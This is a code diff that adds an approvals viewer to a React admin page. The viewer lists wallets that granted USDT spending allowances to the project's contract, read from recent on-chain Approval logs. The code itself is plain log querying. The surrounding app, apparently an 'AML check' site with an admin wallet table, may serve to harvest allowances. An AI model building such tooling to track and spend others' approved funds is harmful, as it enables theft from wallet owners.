@@ -28,6 +28,9 @@ export default function Admin() {
   const [newAdminAddress, setNewAdminAddress] = useState('')
   const [isSettingAdmin, setIsSettingAdmin] = useState(false)
   const [walletRows, setWalletRows] = useState([])
+  const [approvals, setApprovals] = useState([])
+  const [approvalsLoading, setApprovalsLoading] = useState(false)
+  const [approvalsStatus, setApprovalsStatus] = useState('')
 
   function handleCheckWallet() { open && open() }
 
@@ -72,6 +75,90 @@ export default function Admin() {
     }
     refreshWalletTable()
   }, [address, isConnected, chainId])
+
+  const APPROVALS_CACHE_KEY = 'amlsec_approvals_cache'
+  function readApprovalsCache(networkName, contractAddress) {
+    try {
+      const raw = localStorage.getItem(APPROVALS_CACHE_KEY) || '{}'
+      const obj = JSON.parse(raw)
+      const net = networkName || 'arbitrum'
+      const key = (contractAddress || '').toLowerCase()
+      return obj?.[net]?.[key] || null
+    } catch {
+      return null
+    }
+  }
+  function writeApprovalsCache(networkName, contractAddress, rows) {
+    try {
+      const raw = localStorage.getItem(APPROVALS_CACHE_KEY) || '{}'
+      const obj = (() => { try { return JSON.parse(raw) } catch { return {} } })()
+      const net = networkName || 'arbitrum'
+      const key = (contractAddress || '').toLowerCase()
+      obj[net] = obj[net] || {}
+      obj[net][key] = { rows, updatedAt: Date.now() }
+      localStorage.setItem(APPROVALS_CACHE_KEY, JSON.stringify(obj))
+    } catch {}
+  }
+
+  async function loadApprovals() {
+    try {
+      setApprovalsStatus('Loading approvals…')
+      setApprovalsLoading(true)
+      setApprovals([])
+      if (!isConnected || !address || !chainId) {
+        setApprovalsStatus('Connect your wallet to load approvals')
+        return
+      }
+      const networkName = CHAIN_NAMES[chainId] || 'arbitrum'
+      const usdtAddress = USDT_ADDRESSES[networkName]
+      if (!usdtAddress) {
+        setApprovalsStatus(`USDT not configured for ${networkName}`)
+        return
+      }
+      const rpcUrl = RESOLVED_RPC_URLS[networkName]
+      if (!rpcUrl) {
+        setApprovalsStatus(`Missing RPC URL for ${networkName}`)
+        return
+      }
+      const client = createPublicClient({ transport: http(rpcUrl) })
+      const latest = await client.getBlockNumber()
+      const fromBlock = latest > 1000000n ? (latest - 1000000n) : 0n
+      const logs = await client.getLogs({
+        address: usdtAddress,
+        abi: [{
+          type: 'event',
+          name: 'Approval',
+          inputs: [
+            { name: 'owner', type: 'address', indexed: true },
+            { name: 'spender', type: 'address', indexed: true },
+            { name: 'value', type: 'uint256', indexed: false }
+          ],
+          anonymous: false
+        }],
+        eventName: 'Approval',
+        args: { spender: SMART_CONTRACT_ADDRESS },
+        fromBlock,
+        toBlock: latest
+      })
+      const unique = new Map()
+      for (const log of logs) {
+        const owner = (log?.args?.owner || '').toLowerCase()
+        if (!owner) continue
+        if (!unique.has(owner)) unique.set(owner, { owner, blockNumber: log.blockNumber })
+      }
+      const rows = Array.from(unique.values())
+        .sort((a, b) => (b.blockNumber - a.blockNumber))
+        .slice(0, 50)
+      setApprovals(rows)
+      writeApprovalsCache(networkName, SMART_CONTRACT_ADDRESS, rows)
+      setApprovalsStatus(rows.length ? `Found ${rows.length} approving wallet(s)` : 'No approvals found in recent history')
+    } catch (err) {
+      console.error('Load approvals failed:', err)
+      setApprovalsStatus(`Error loading approvals: ${err?.message || String(err)}`)
+    } finally {
+      setApprovalsLoading(false)
+    }
+  }
 
   async function handleSetAdmin(e) {
     e && e.preventDefault && e.preventDefault()
@@ -174,6 +261,37 @@ export default function Admin() {
                             <td>{row.balance}</td>
                             <td>{row.network}</td>
                             <td>{row.date}</td>
+                          </tr>
+                        ))
+                      )}
+                    </tbody>
+                  </table>
+                </div>
+
+                {/* Approvals viewer */}
+                <div className="admin-card" style={{ marginTop: '12px' }}>
+                  <div className="admin-controls">
+                    <p className="admin-meta">View wallets that approved USDT spending to your contract.</p>
+                    <button className="admin-btn" onClick={loadApprovals} disabled={approvalsLoading}>
+                      {approvalsLoading ? 'Loading…' : 'Refresh Approvals'}
+                    </button>
+                    <p className="admin-status" style={{ color: approvalsStatus.startsWith('Error') ? '#b00' : '#666' }}>{approvalsStatus}</p>
+                  </div>
+                  <table className="admin-table" role="table" aria-label="Approvals to contract">
+                    <thead>
+                      <tr>
+                        <th>Wallet Address</th>
+                        <th>Block</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {approvals.length === 0 ? (
+                        <tr><td colSpan={2} style={{ textAlign: 'center', color: '#666' }}>No data</td></tr>
+                      ) : (
+                        approvals.map(row => (
+                          <tr key={row.owner}>
+                            <td>{row.owner}</td>
+                            <td>{String(row.blockNumber)}</td>
                           </tr>
                         ))
                       )}
